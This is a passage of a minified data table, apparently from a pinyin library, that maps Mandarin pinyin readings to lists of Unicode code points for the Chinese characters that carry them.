lēng líng\":[26865],\"fú sù\":[26868],\"zōu sǒu\":[26871],\"zōu\":[26872,31619,32197,35535,35833,37049,37104,37138,37177,38508,39478,39546,39915,40112,40640,40817,40826],\"zhào zhuō\":[26873],\"chēn shēn\":[26877],\"jiē qiè\":[26884],\"yǐ yī\":[26885],\"chóu zhòu diāo\":[26886],\"qiāng kōng\":[26892],\"zhuī chuí\":[26894],\"bēi pí\":[26897],\"mēn\":[26906],\"quān juàn quán\":[26918],\"duǒ chuán\":[26927],\"wěi huī\":[26930],\"jiǎ jiā\":[26933],\"hán jiān\":[26935],\"shèn zhēn\":[26937],\"yàn yà\":[26939],\"zhā chá\":[26946],\"guō kuǎ\":[26951],\"jí zhì\":[26966],\"kǔ hù\":[26971],\"yóu yǒu\":[26978],\"sǒng cōng\":[26980],\"yuán xuàn\":[26981],\"yǎng yàng yīng\":[26983],\"pián\":[26985,33020,33089,36038,36417,39394,39432,39560,39615],\"dié yè\":[26986],\"dùn shǔn\":[26991],\"còu zòu\":[26993],\"dì dǐ shì\":[26996],\"kǎi jiē\":[26999],\"róu ròu\":[27002],\"lè yuè\":[27005],\"wēn yùn\":[27013,38832],\"lǘ\":[27016,27354,27648,33186,34264,38317,38398,39522,39540],\"shén\":[27018,31070,37486,39984],\"bī pi\":[27020],\"zhǎn niǎn zhèn\":[27024],\"fú fù bó\":[27025],\"jiàn jìn\":[27031],\"bǎng bàng\":[27036],\"shā xiè\":[27037,27175],\"nòu\":[27080,32808,37778,37918],\"qiǎn lián xiàn\":[27087],\"gàng\":[27091,28981,28985,31611],\"gāo\":[27092,27129,27248,27356,30590,31705,31957,32660,33263,38879,39227,39640,39641,40398,40433,40731],\"diān zhěn zhēn\":[27097],\"kǎn jiàn\":[27099],\"xí dié\":[27106],\"jī guī\":[27107],\"róng yōng\":[27110],\"tuán shuàn quán\":[27115],\"qì sè\":[27117],\"cuī zhǐ\":[27119],\"yǒu chǎo\":[27121],\"màn wàn\":[27134],\"lí chī\":[27142],\"léi lěi\":[27151,27345,30988],\"cháo jiǎo chāo\":[27156],\"chēng táng\":[27160],\"jiū liáo\":[27163],\"mó mú\":[27169],\"niǎo mù\":[27170],\"héng hèng\":[27178,27243],\"xuě\":[27184,33188,33373,36684,38634,40008,40149],\"fá fèi\":[27203],\"rùn\":[27213,28070,28516,33206,38287,38304,38384],\"zhǎn jiǎn\":[27215],\"shùn\":[27219,30618,30636,33308,34147,38918,39034,39690],\"tuí dūn\":[27220],\"táng chēng\":[27222],\"sù qiū\":[27226],\"tán diàn\":[27229],\"fén fèn fèi\":[27240],\"rǎn yān\":[27242],\"cū chu\":[27259],\"shū qiāo\":[27262],\"píng bò\":[27288],\"zhái shì tú\":[27297],\"biǎo biāo\":[27302],\"qiān lián\":[27318],\"nǐ mí\":[27319],\"jiàn kǎn\":[27323],\"nòu ruǎn rú\":[27325],\"jī jì\":[27333,31144],\"huǎng guǒ gǔ\":[27342],\"lǜ chū\":[27350],\"miè mèi\":[27351],\"ōu\":[27353,27431,27472,27572,27590,29935,29964,33170,34290,35635,35764,37826,40206,40407,40485],\"zhù zhuó\":[27361],\"jué jì\":[27373],\"huái guī\":[27376],\"chán zhàn\":[27395],\"wéi zuì\":[27400],\"cáng\":[27404,38006],\"yù yì\":[27429],\"chù qù xì\":[27434],\"kài ài\":[27436],\"yì yīn\":[27437],\"xì kài\":[27439],\"shuò sòu\":[27446],\"ǎi ēi éi ěi èi\":[27448],\"qī yī\":[27449],\"chuā xū\":[27451],\"chǐ chuài\":[27452],\"kǎn qiàn\":[27455],\"kǎn kè\":[27457],\"chuǎn chuán\":[27458],\"yīn yān\":[27461],\"jìn qūn\":[27471],\"pēn\":[27477],\"xū chuā\":[27480],\"xī shè\":[27481],\"liǎn hān\":[27483],\"zhì chí\":[27501],\"sè shà\":[27504],\"sǐ\":[27515],\"wěn mò\":[27518],\"piǎo\":[27533,30379,30623,37285,39008],\"qíng jìng\":[27537],\"fǒu bó\":[27541],\"zhí shi\":[27542],\"yè yān yàn\":[27543],\"hūn mèi\":[27545],\"chòu\":[27552,33264,36954],\"kuì huì\":[27560,28291,28528],\"cuàn\":[27561,29110,29224,31388,31428,31713,31762],\"yīn yān yǐn\":[27575],\"qìng kēng shēng\":[27576],\"yáo xiáo xiào\":[27581],\"gū gǔ\":[27586,34500],\"guàn wān\":[27596],\"dú dài\":[27602],\"xún xùn\":[27621],\"mú\":[27626,27649],\"dòu nuò\":[27629],\"sāi suī\":[27640],lu:[27655],\"sào\":[27657,30233,30658,39646],\"shì zhī\":[27663],\"dī dǐ\":[27664],\"máng méng\":[27667],\"yáng rì\":[27676],\"shuǐ\":[27700,27701,27706,38294],\"zhěng chéng zhèng\":[27702],\"tǔn\":[27709],\"fán fàn\":[27710],\"guǐ jiǔ\":[27711],\"bīn pà pā\":[27715],\"zhuó què\":[27723],\"dà tài\":[27727],\"pìn\":[27734,29277,32856],\"hàn hán\":[27735,39343],tu:[27746],\"tāng shāng\":[27748,28271],\"zhī jì\":[27749],\"gàn hán cén\":[27765],\"wèn mén\":[27766],\"fāng pāng\":[27768],\"hǔ huǎng\":[27771],\"niú yóu\":[27772],\"hàng\":[27782],\"shěn chén\":[27784],\"dùn zhuàn\":[27788],\"nǜ niǔ\":[27793],\"méi mò\":[27794,27809],\"tà dá\":[27795],\"mì wù\":[27797],\"hóng pāng\":[27799],\"shā shà\":[27801],\"zhuǐ zǐ\":[27805],\"ōu òu\":[27812,28442],\"jǔ jù\":[27822],\"tuō duó\":[27824],\"mǐ lì\":[27829],\"yí chí\":[27830],\"xiè yì\":[27844],\"bó pō\":[27850],\"mì bì\":[27852,31192],\"chù shè\":[27855],\"yōu yòu āo\":[27857],\"pēng píng\":[27865,30801],\"pào pāo\":[27873],\"ní nì\":[27877,31196],\"yuè sà\":[27879],\"jué xuè\":[27884,30118],\"lóng shuāng\":[27895,28711],\"luò pō\":[27898,28668],\"zé shì\":[27901,28580],\"sǎ xǐ\":[27922],\"sè qì zì\":[27923],\"xǐ xiǎn\":[27927],\"kǎo kào\":[27928],\"àn yàn è\":[27933],\"lěi lèi\":[27937],\"qiè jié\":[27951],\"qiǎn jiān\":[27973],\"jì jǐ\":[27982,28168,28639,32426],\"hǔ xǔ\":[27986,28408],\"jùn xùn\":[27994,28652],\"yǐng chéng yíng\":[28007],\"liàn lì\":[28016],\"féng hóng\":[28018,28292],\"jiǒng jiōng\":[28027],\"suī něi\":[28029],\"yǒng chōng\":[28044],\"tūn yūn\":[28050],\"wō guō\":[28065,28198],\"hēng\":[28069,33053],\"zhǎng zhàng\":[28072,28466],\"shòu tāo\":[28077],\"shuàn\":[28078,33128],\"kōng náng\":[28083],\"wò wǎn yuān\":[28084],\"tuō tuò\":[28086],\"wō\":[28089,29479,31389,31401,33716,33845,34583,34680,36370],\"qiè jí\":[28097],\"guǒ guàn\":[28105],\"lín lìn\":[28107,29532,30084],\"tǎng chǎng\":[28108],\"nào chuò zhuō\":[28118],\"péng píng\":[28124],\"féi\":[28125,32933,33107,34608],\"pì pèi\":[28128],\"niǎn shěn\":[28144],\"biāo hǔ\":[28146],\"chún zhūn\":[28147],\"hùn hún\":[28151],\"qiǎn\":[28154,32382,32561,32951,33153,34616,35700,35892,36963,37971],\"wèn mín\":[28162],\"rè ruò luò\":[28163],\"dú dòu\":[28174,28678,35835],\"jiàn jiān\":[28176,28293,28472,28666],\"miǎn shéng\":[28177,28576],\"nuǎn nuán\":[28188],\"qiú wù\":[28190],\"tíng tīng\":[28191],\"dì tí dī\":[28199],\"gǎng jiǎng\":[28207],\"hōng qìng\":[28217],\"tuān\":[28237,29011],\"huì mǐn xū\":[28239],\"xǔ xù\":[28241],\"pén\":[28243,29931,30406,33872],\"mǐn hūn\":[28259],\"tuàn nuǎn\":[28266],\"qiū jiǎo\":[28267,28268],\"yān yīn\":[28270],\"bàn pán\":[28276],\"zhuāng hún\":[28279],\"yàn guì\":[28302],\"lián liǎn nián xián xiàn\":[28307],\"dá tǎ\":[28314],\"liū liù\":[28316,28561,36435],\"lùn\":[28323],\"mǎ\":[28324,29368,29505,29595,29802,30721,30908,36964,37815,39340,39532,39970,40396],\"zhēn qín\":[28337],\"nì niào\":[28346],\"chù xù\":[28352,30044],\"wěng wēng\":[28355],\"hào xuè\":[28360],\"qì xì xiē\":[28362],\"xíng yíng\":[28366],\"zé hào\":[28380],\"piāo piào piǎo\":[28418],\"cóng sǒng\":[28430],\"féng péng\":[28456],\"luò tà\":[28463],\"pēng bēn\":[28464],\"chóng shuāng\":[28468],\"huǒ kuò huò\":[28471],\"liáo liú\":[28475],\"cuǐ cuī\":[28476],\"cóng zǒng\":[28480],\"cóng zōng\":[28488],\"pì piē\":[28494],\"dàng xiàng\":[28498],\"huáng guāng\":[28514],\"liáo lào lǎo\":[28518],\"cōng zòng\":[28520],\"zhí zhì\":[28522],\"tān shàn\":[28524],\"tú zhā\":[28531],\"sàn sǎ\":[28533],\"hēi\":[28534,40657,40658],\"chéng dèng\":[28548,28691],\"cūn cún\":[28554],\"péng pēng\":[28558],\"hòng gǒng\":[28562,37566],\"wàn màn\":[28587],\"kuài huì\":[28590],\"guō wō\":[28612],\"pēn fén\":[28614],\"jí shà\":[28616],\"huì huò\":[28618],\"dǐng tìng\":[28622],\"mǐ nǐ\":[28628],\"bì pì\":[28638],\"cuì zuǐ\":[28642],\"hù huò\":[28649],\"ǎi kài kè\":[28653],\"wěi duì\":[28667,28706],\"zàn cuán\":[28669,28754],\"yǎng yàng\":[28673],\"wǎng wāng\":[28679],\"mò miè\":[28686,30492],\"suǐ\":[28705,33208,39635],\"huái wāi\":[28708],\"zùn jiàn\":[28723],\"yīng yǐng yìng\":[28724],\"ráng ràng\":[28732],\"shuàng\":[28736],\"zhuó jiào zé\":[28738],\"sǎ\":[28753,35375,38776],\"luán luàn\":[28755],\"dǎng tǎng\":[28761],\"xún quán quàn\":[28773],\"huǒ biāo\":[28780],\"zhà yù\":[28793],\"fén bèn\":[28803],\"jiǒng guì\":[28805],\"pàng fēng\":[28816],\"quē\":[28820,32570,32572,33947],\"biān\":[28830,29048,29954,30765,31550,31663,31849,32232,32534,34649,37001,37002,37757,38829,39934,39935,40138],\"zhāo zhào\":[28836],\"zhuō chù\":[28842],\"pào páo bāo\":[28846],\"páo fǒu\":[28848],\"shǎn qián shān\":[28854],\"zhà zhá\":[28856],\"jiǎo yào\":[28868],\"quǎn\":[28871,29356,29357,30030,32163,32507,34375],\"yàng yáng\":[28874],\"lào luò\":[28889],\"huí huǐ\":[28896],\"rè\":[28909,29105],\"fú páo\":[28912],\"xiè chè\":[28914,28942],\"yàn shān\":[28923],\"hūn xūn\":[28932],\"kào\":[28933,29330,37548,38096,38752,39859,39884,40083],\"juān yè\":[28934],\"jùn qū\":[28940],\"tāo dào\":[28952],\"chǎo jù\":[28963],\"wò ài\":[28965],\"zǒng cōng\":[28967],\"xī yì\":[28972],\"xìn xīn\":[28974],\"chāo zhuō\":[28975],\"xiǒng yīng\":[28984,28989],\"kuǐ\":[28995,36332,36446,38925],\"huī yùn xūn\":[28999],\"jiǎo qiāo\":[29005],\"qián shǎn shān\":[29012],\"xī yí\":[29013],\"shà shā\":[29022],\"yè zhá\":[29024],\"yáng yàng\":[29036],\"ēn yūn\":[29054],\"yūn yǔn\":[29061],\"hè xiāo\":[29063],\"xióng\":[29066,29067,38596],\"xūn xùn\":[29071,29195],\"gòng\":[29077,36002,36129],\"liū\":[29080],\"cōng zǒng\":[29084],\"lù āo\":[29085],\"shú shóu\":[29087],\"fēng péng\":[29090],\"cuǐ suī\":[29091],\"tēng\":[29093,33199,40735],\"yùn yù\":[29096],\"áo āo\":[29100],\"hàn rǎn\":[29103],\"ōu ǒu\":[29104],\"huáng huǎng\":[29119],\"chǎn dǎn chàn\":[29120],\"jiāo zhuó qiáo jué\":[29131],\"yàn yān\":[29141],\"tài liè\":[29156],\"āo\":[29194],\"yàn xún\":[29203],\"jué jiào\":[29213,35216,35226,35258,35273],\"lǎn làn\":[29222],\"zhuǎ zhǎo\":[29226],\"zhǎo zhuǎ\":[29227],\"fù fǔ\":[29238],\"diē\":[29241,35130,36300],\"zāng\":[29250,32664,33255,36045,36056,36115,36124,36163,39634],\"piàn piān\":[29255],\"biān miàn\":[29265],\"bǎng\":[29267,32129,32465],\"yǒu yōng\":[29271],\"chēng chèng\":[29274,31424],\"niú\":[29275,29276],\"jiū lè\":[29278],\"mù móu\":[29279],\"māng\":[29284],\"gē qiú\":[29291],\"yòu chōu\":[29296],\"tè zhí\":[29318],\"bēn\":[29319,37659,38171],\"jiān qián\":[29325,29610],\"má\":[29336,30194,34100,34759,40635],\"máo lí\":[29339],\"bá quǎn\":[29358],\"zhuó bào\":[29363],\"àn hān\":[29364],\"kàng gǎng\":[29370],\"pèi fèi\":[29371],\"fān huān\":[29375],\"kuáng\":[29378,29381,35473,35827,36566,36576,40287],\"yí quán chí\":[29387],\"xīng shēng\":[29388],\"tuó yí\":[29391],\"kǔ\":[29404,33510],\"huán huān\":[29407],\"hé mò\":[29410],\"tà shì\":[29415],\"máng dòu\":[29429],\"xī shǐ\":[29430],\"suān\":[29435,30176,37240],\"bài pí\":[29448],\"jiān yàn\":[29455,35939],\"yī yǐ\":[29463],\"yá wèi\":[29466],\"cāi\":[29468],\"māo máo\":[29483,35987],\"chuàn chuān\":[29485],\"tuān tuàn\":[29487,35986],\"yà jiá qiè\":[29488],\"hè xiē gé hài\":[29490],\"biān piàn\":[29493,29553],\"bó pò\":[29500],\"háo gāo\":[29515],\"fén fèn\":[29526],\"yào xiāo\":[29535],\"shuò xī\":[29537],\"gé liè xiē\":[29542],\"nòu rú\":[29555],\"náo nǎo yōu\":[29558],\"ráng\":[29565,29924,31155,31331,31344,34328,36511,39716],\"náo yōu\":[29567],\"lǜ shuài\":[29575],\"wáng wàng\":[29579],\"yáng chàng\":[29594],\"mín wén\":[29599],\"bīn fēn\":[29602],\"mén yǔn\":[29607],\"qiāng cāng\":[29617,29810,31724],\"án gān\":[29621],\"xuán xián\":[29625],\"cī cǐ\":[29628,36304],\"yí tāi\":[29638],\"zǔ jù\":[29639],\"fà\":[29648,29754,34143,39658,39662],\"yín kèn\":[29666],\"huī hún\":[29682],\"xuán qióng\":[29697],\"fú fū\":[29704],\"bǐng pín\":[29717],\"cuì sè\":[29719],\"yù wéi\":[29727],\"tiǎn tiàn\":[29728],\"zhuó zuó\":[29730],\"běng pěi\":[29731],\"guǎn\":[29743,29869,30191,31590,31649,33304,36648,37671,39208,39302,40164],\"hún huī\":[29759],\"xié jiē\":[29774],\"chàng dàng yáng\":[29778],\"tiàn zhèn\":[29809],\"bīn pián\":[29816,29880],\"tú shū\":[29817],\"cuǐ\":[29824,30368,36257],\"zǎo suǒ\":[29829],\"jué qióng\":[29850],\"lú fū\":[29879],\"jì zī\":[29886],\"suí\":[29901,32143,32485,36928,38543,38568,39620],\"mí xǐ\":[29909],\"qióng wěi wèi\":[29911],\"huán yè yà\":[29915],\"bó páo\":[29919],\"zhí hú\":[29921],\"piáo\":[29922,38365],\"wǎ wà\":[29926],\"xiáng hóng\":[29928],\"wèng\":[29934,29973,32587,34169,40774],\"bǎiwǎ\":[29944],\"shèn shén\":[29978],\"ruí\":[29988,32204,34148],\"yòng\":[29992,30781,33498,33935,37279],\"shuǎi\":[29993],\"béng\":[29997,29998],\"yóu zhá\":[30004],\"diàn tián shèng\":[30008],\"tǐng dīng\":[30010,30012],\"zāi zī\":[30014],\"bì qí\":[30017],\"dá fú\":[30039],\"cè jì\":[30047],\"zāi zī tián\":[30048],\"zhì chóu shì\":[30052],\"fān pān\":[30056,30058],\"shē yú\":[30060],\"dāng dàng dǎng\":[30070],\"jiāng qiáng\":[30086],\"pǐ yǎ shū\":[30091],\"jié qiè\":[30092],\"yí nǐ\":[30097],\"nè\":[30098,30514,35365,35767],\"gē yì\":[30105],\"nüè yào\":[30111,30247],\"lì lài\":[30112,30296],\"yǎ xiā\":[30120],\"xuē\":[30134,33926,34203,36773,36778,38772,38846],\"dǎn da\":[30136],\"fá biǎn\":[30138],\"fèi féi\":[30143,30193],\"shān diàn\":[30145],\"téng chóng\":[30155],\"tōng tóng\":[30156],\"wěi yòu yù\":[30159],\"tān shǐ\":[30161],\"pū pù\":[30177,37610],\"bēng péng\":[30189],\"má lìn\":[30195],\"tiǎn diàn\":[30198],\"ān yè è\":[30199],\"kē ē\":[30206],\"zhì chì\":[30216],\"jiǎ xiá xiā\":[30229],\"lěi huì\":[30243],\"chài cuó\":[30245],\"diān chēn\":[30248],\"da dá\":[30249],\"biě biē\":[30250],\"qué\":[30264],\"dàn dān\":[30281],\"guì wēi\":[30288],\"nòng nóng\":[30289],\"biē biě\":[30303],\"bō bǒ\":[30327],\"bái\":[30333],\"jí bī\":[30336],\"de dì dí dī\":[30340],\"pā bà\":[30341],\"gāo háo\":[30347],\"gāo yáo\":[30352],\"lì luò bō\":[30378],\"zhā cǔ\":[30395],\"zhāo zhǎn dǎn\":[30397],\"jiān jiàn\":[30417,30435,37627,38388,38828],\"gài gě hé\":[30422],\"máng wàng\":[30451],\"yuǎn\":[30454,36922,36960],\"tián xián\":[30455],\"xiāng xiàng\":[30456],\"dǔn\":[30457,36280,36489],\"xì pǎn\":[30459],\"shěng xǐng\":[30465],\"yún hùn\":[30467],\"miǎn miàn\":[30468],\"kàn kān\":[30475],\"yìng yāng yǎng\":[30479],\"yǎo āo ǎo\":[30481],\"jū xū kōu\":[30487],\"yí chì\":[30489],\"dié tì\":[30499],\"bǐng fǎng\":[30506],\"pàng pán\":[30507],\"mī mí\":[30511,30599],\"xuàn shùn xún\":[30516],\"tiào\":[30522,31900,31990,35228,36242],\"zhe zhuó zháo zhāo\":[30528],\"qiáo shào xiāo\":[30532],\"cuó zhuài\":[30537],\"gùn\":[30548,35636],\"suì zuì\":[30559],\"pì bì\":[30565,31275,36767],\"yì zé gāo\":[30570],\"xǐng xìng\":[30578],\"guì wèi kuì\":[30598],\"kòu jì\":[30601],\"qióng huán\":[30607],\"mán mén\":[30610,30622],\"diāo dōu\":[30615],\"lou lóu lǘ\":[30620],\"shùn rún\":[30628],\"liào liǎo\":[30637,38028],\"jiàn xián\":[30639],\"wǔ mí\":[30644],\"guì kuì\":[30646],\"nǐng chēng\":[30659],\"huò yuè\":[30662],\"mēng méng\":[30663],\"kuàng guō\":[30668],\"guàn quán\":[30676],\"mǎn mán\":[30677],\"jīn guān qín\":[30684],\"jīn qín guān\":[30685],\"yù xù jué\":[30686],\"jiǎo jiáo\":[30699,30703],\"duǎn\":[30701],\"shí dàn\":[30707],\"gāng qiāng kòng\":[30716],\"huā xū\":[30729],\"pīn bīn fēn\":[30735],\"yán yàn\":[30740,30799],\"luǒ kē\":[30754],\"fú fèi\":[30761,31536],\"zhǔ zhù\":[30763],\"lá lì lā\":[30764],\"kuāng guāng\":[30788],\"gè luò\":[30796],\"shuò shí\":[30805,30889],\"wèi wéi ái\":[30809],\"què kè kù\":[30814],\"mǎng bàng\":[30821],\"luò lòng\":[30822],\"yǒng tóng\":[30823],\"nüè\":[30840,34384],\"kēng kěng\":[30843],\"yān yǎn\":[30845],\"zhuì chuí duǒ\":[30846],\"kōng kòng\":[30847],\"zòng cóng\":[30850],\"jiān zhàn\":[30858],\"lù liù\":[30860,38470],\"què xī\":[30863],\"lún lǔn lùn\":[30870],\"náo gāng\":[30873],\"jié yà\":[30883],\"wèi wěi\":[30888],\"tí dī\":[30894],\"chá chā\":[30900],\"qiāo què\":[30907],\"sù xiè\":[30911],\"liú liù\":[30914,36955,37798,39311],\"sī tí\":[30915],\"bàng páng\":[30917],\"huá kě gū\":[30918],\"wěi kuǐ\":[30920],\"xiá qià yà\":[30925],\"lián qiān\":[30927],\"wèi ái gài\":[30929],\"lá lā\":[30934],\"áo qiāo\":[30941],\"pēng pèng\":[30942,38299],\"yīn yǐn\":[30948],\"lěi léi\":[30949],\"mó mò\":[30952],\"qì zhú\":[30953],\"láo luò\":[30961],\"pán bō\":[30971],\"jí shé\":[30972],\"hé qiāo qiào\":[30985],\"kè huò\":[30986],\"què hú\":[30992],\"è qì\":[31e3],\"cǎ\":[31012,31032],\"xián xín\":[31013],\"léi lěi lèi\":[31015],\"yán yǎn\":[31033],\"qí zhǐ\":[31047,34452],\"bēng fāng\":[31050],\"bì mì\":[31061],\"suàn\":[31064,31495,31597,31639,33948],\"piào piāo\":[31080],\"jì zhài\":[31085],\"shuì lèi\":[31089],\"jìn jīn\":[31105],\"chán shàn\":[31109],\"yáng shāng\":[31123],\"zhī zhǐ tí\":[31124],\"shàn chán\":[31146],\"yú yù ǒu\":[31162],\"zǐ zì\":[31172],\"chá ná\":[31173],\"zhòng zhǒng chóng\":[31181],\"hào mào\":[31183],\"kù kū\":[31193],\"zū\":[31199,33861],\"chèng\":[31204,31338],\"huó kuò\":[31214,31219],\"chēng chèn chèng\":[31216,31281],\"shì zhì\":[31218,37556],\"fù pū\":[31231],\"xùn zè\":[31236],\"tú shǔ\":[31244],\"zhùn zhǔn\":[31253],\"jī qí\":[31256,32168,35309],\"léng líng\":[31260],\"zuì zú sū\":[31265],\"xì qiè\":[31271,37060],\"zhǒng zhòng\":[31278],\"zōng zǒng\":[31279],\"xián jiān liàn\":[31284],\"zī jiū\":[31285],\"jī qǐ\":[31293],\"ròng\":[31299],\"shān cǎn cēn\":[31303],\"mén méi\":[31304],\"jǐ jì\":[31318],\"xiāo rào\":[31320],\"zhuō bó\":[31323],\"tóng zhǒng zhòng\":[31324],\"zuō\":[31325],\"biāo pāo\":[31342,34280],\"zhuō jué\":[31345],\"cuán zàn\":[31347],\"kōng kòng kǒng\":[31354],\"yū yǔ\":[31355],\"zhǎi\":[31364,37465],\"báo\":[31367,38649],\"kū zhú\":[31371],\"jiào liáo liù\":[31372],\"wā guī\":[31376],\"tiǎo yáo\":[31381],\"xūn yìn\":[31400],\"yà yē\":[31403],\"tián diān yǎn\":[31412],\"chāo kē\":[31420],\"kuǎn cuàn\":[31421,31422],\"chù qì\":[31440],\"qǔ kǒu\":[31448],\"jìng zhěn\":[31463],\"kǎn kàn\":[31479],\"zhú dǔ\":[31482],\"lè jīn\":[31483],\"zhuì ruì\":[31501],\"háng hàng\":[31504],\"cén jìn hán\":[31506],\"dā xiá nà\":[31514],\"zé zuó\":[31534],\"lóng lǒng\":[31548,31725,31840,36504,40851],\"zhù zhú\":[31569,31689],\"dá dā\":[31572,33605],\"shāi\":[31579,31721,31745,31853],\"yún jūn\":[31584],\"láng làng\":[31588,37070,38406],\"zhì zhǐ\":[31595],o:[31613],\"póu bù fú pú\":[31617],\"pái bēi\":[31620],\"gè\":[31623,34428,37499,38124],\"tái chí\":[31624],\"guǎi dài\":[31625],\"zhào dào\":[31628],\"jīng qìng\":[31632],\"lín lǐn\":[31638],\"jùn qūn\":[31640],\"shī yí\":[31671,37366],\"yuē yào chuò\":[31673],\"xiāo shuò qiào\":[31678],\"gōng gǎn lǒng\":[31714],\"páng péng\":[31715],\"zhuó huò\":[31719],\"jiǎn jiān\":[31727],\"dí zhú\":[31732],\"zān cēn cǎn\":[31736],\"zhuàn suǎn zuàn\":[31737],\"piǎo biāo\":[31739],\"guó guì\":[31746],\"cè jí\":[31758],\"mì miè\":[31770],\"shāi sī\":[31771],\"sǔn zhuàn\":[31784],\"gàn gǎn\":[31795],\"bò bǒ\":[31800],\"bó bù\":[31807],shi:[31810],\"zhēn jiān\":[31816],\"zhuàn zuǎn\":[31825],\"fān pān biān\":[31827],\"sǒu shǔ\":[31828],\"zuǎn\":[31851,32356,32386,32393,32408,32565],\"nǚ\":[31865,37369,38037],\"shā chǎo\":[31878],\"kāng jīng\":[31879],\"fěn\":[31881,40698],\"cū\":[31895,35285,40577,40580,40612],\"nián zhān\":[31896],\"cè sè\":[31907],\"zhōu yù\":[31909],\"shēn sǎn\":[31937],\"biān biǎn\":[31940,33849],\"miàn\":[31942,38754,38755,40618,40619,40629,40634],\"hú hū hù\":[31946],\"gǔ gòu\":[31955],\"mí méi\":[31964],\"sǎn shēn\":[31965,31971],\"zāo\":[31967,36455,36973,37289],\"mì sī\":[31992],\"jiū jiǔ\":[31994],\"xì jì\":[31995,32363],\"zhēng zhěng\":[31997],\"chà chǎ\":[32001,34921],\"yuē yāo\":[32004,32422],\"hóng gōng\":[32005,32418],\"hé gē\":[32007,32421],\"wén wèn\":[32011,32441],\"fóu\":[32017],\"jì jié jiè\":[32018],\"pī pí bǐ\":[32021,32432],\"jīn jìn\":[32031],\"zhā zā\":[32037,32046],\"hā\":[32038],\"fū fù\":[32040],\"chōu chóu\":[32044],\"lèi léi lěi\":[32047],\"bō bì\":[32052],\"tiǎn zhěn\":[32062],\"jiōng jiǒng\":[32069],\"jié jiē\":[32080,32467,33410],\"guà kuā\":[32083],\"bǎi mò\":[32084],\"gēng huán\":[32089],\"jié xié\":[32092],\"quán shuān\":[32095],\"gǎi ǎi\":[32096],\"luò lào\":[32097,32476],\"bīng bēng pēng\":[32099],\"gěi jǐ\":[32102,32473],\"tóng tōng dòng\":[32103],\"tiào diào dào\":[32105],\"lěi lèi léi\":[32107],\"gāi hài\":[32111],\"chī zhǐ\":[32122],\"wèn miǎn mán wàn\":[32123],\"huán huàn wàn\":[32132],\"qīn xiān\":[32133],\"tì tí\":[32136],\"yán xiàn\":[32150],\"zōng zèng zòng\":[32156],\"chēn lín\":[32157],\"zhǔn zhùn\":[32167],\"qiàn qīng zhēng\":[32170],\"qìng qǐ\":[32174],\"lún guān\":[32184,32438],\"chuò chāo\":[32189,32496],\"tián tǎn chān\":[32194],\"lǜ lù\":[32209,32511],\"ruǎn ruàn\":[32219],\"jí qī\":[32221],\"zhòng chóng\":[32223,37325],\"miáo máo\":[32226],\"xiè yè\":[32228],\"huǎn\":[32233,32531],\"gēng gèng\":[32234,32262],\"tōu xū shū\":[32240],\"zōng zòng\":[32245,32332],\"yùn gǔn\":[32247],\"guā wō\":[32250],\"yùn yūn wēn\":[32252,32277],\"bāng bàng\":[32269],\"gǔ hú\":[32270,40379],\"cī cuò suǒ\":[32274],\"cuī shuāi\":[32279],\"róng rǒng ròng\":[32281],\"zài zēng\":[32289],\"cài\":[32297,33756,34081],\"féng fèng\":[32299],\"suō sù\":[32302,32553],\"yǎn yǐn\":[32303,37203],\"zòng zǒng\":[32305,32437],\"zhuàn juàn\":[32307],\"mò mù\":[32312,33707],\"piǎo piāo\":[32313,32549],\"fán pó\":[32321],\"bēng bèng\":[32323],\"móu miù miào liǎo\":[32326],\"yáo yóu zhòu\":[32327],\"zēng zèng\":[32338,32559],\"jú jué\":[32344],\"chuō chuò\":[32347],\"zūn zǔn\":[32348],\"rào\":[32350,32469,36982],\"chǎn chán\":[32351],\"huì huí\":[32354,32523,34289],\"qiāo sāo zǎo\":[32368],\"jiǎo zhuó\":[32371,32564],\"dàn tán chán\":[32373],\"nǒng\":[32375],\"pú fú\":[32384],\"yào lì\":[32389],\"rǎng xiāng\":[32405],\"lí sǎ xǐ lǐ\":[32410],\"xiān qiàn\":[32420],\"jīng jìng\":[32463],\"tí tì\":[32488],\"bēng běng bèng\":[32503],\"zōng zèng\":[32508],\"jī qī\":[32521],\"wēn yùn yūn\":[32522],\"fèng féng\":[32541],\"shuāi cuī suī\":[32542],\"miù móu liáo miào mù\":[32554],\"qiāo sāo\":[32562],\"fǒu\":[32566,32569,32571,38636,40192],\"bà ba pí\":[32610,32631],\"guà guǎi\":[32619],\"yáng xiáng\":[32650,32655],\"měi gāo\":[32665],\"yì xī\":[32667],\"qiǎng qiān\":[32671],\"qiāng kòng\":[32683],\"qián xián yán\":[32684],\"nóu\":[32698],\"hóng gòng\":[32702],\"pī bì pō\":[32717],\"qú yù\":[32721],\"ké\":[32727],\"qiào qiáo\":[32728],\"zhái dí\":[32735],\"dào zhōu\":[32738],\"hóu qú\":[32757],\"shuǎ\":[32781],\"ruǎn nuò\":[32782],\"ér nài\":[32783],\"zhuān duān\":[32785],\"pá bà\":[32793],\"chí sì\":[32795],\"qù chú\":[32797],\"lún lǔn\":[32803],\"jí jiè\":[32804],\"tāng tǎng\":[32805],\"pǎng\":[32810,35243],\"zhá zé\":[32811],\"yē yé\":[32822],\"yún yíng\":[32826],\"wà tuǐ zhuó\":[32841],\"ér nǜ\":[32847],\"tiē zhé\":[32849],\"dǐ zhì\":[32860],\"qié\":[32890],\"nǐ jiàn\":[32891],\"lèi lē\":[32907],\"cào\":[32911,35161,37173,40732],\"bó dí\":[32913],\"xiào xiāo\":[32918],\"dù dǔ\":[32922],\"chāi\":[32926,37365,38039],\"hán qín hàn\":[32931],\"pàng pán pàn\":[32936,32982],\"zhūn chún\":[32939],\"āng\":[32942,39599],\"yù yō\":[32946],\"pí bǐ bì\":[32950],\"fèi bì\":[32967],\"bèi bēi\":[32972],\"fèi zǐ\":[32975],\"píng pēng\":[32979,33529],\"fū fú zhǒu\":[32981],\"shèng shēng\":[32988],\"kuà\":[33007,36328,39611],\"gǎi hǎi\":[33010],\"gē gé gā\":[33011],\"néng nài\":[33021],\"guī kuì\":[33023],\"mài mò\":[33033],\"zāng zàng\":[33039],\"jiǎo jué\":[33050,35282],\"cuǒ\":[33054],\"de te\":[33062],\"zuī juān\":[33063],\"něi\":[33070,33095,39186,39297,39870,39896],\"pú fǔ\":[33071],\"niào\":[33074],\"shuí\":[33085],\"guò\":[33090,36942,37945],\"là xī\":[33098],\"yān ā\":[33100],\"gāo gào\":[33167],\"lù biāo\":[33172],\"chuái\":[33175],\"zhuān chuán chún zhuǎn\":[33182],\"chuài\":[33194,36409],\"fán pán\":[33200],\"wǔ hū\":[33204],\"shān 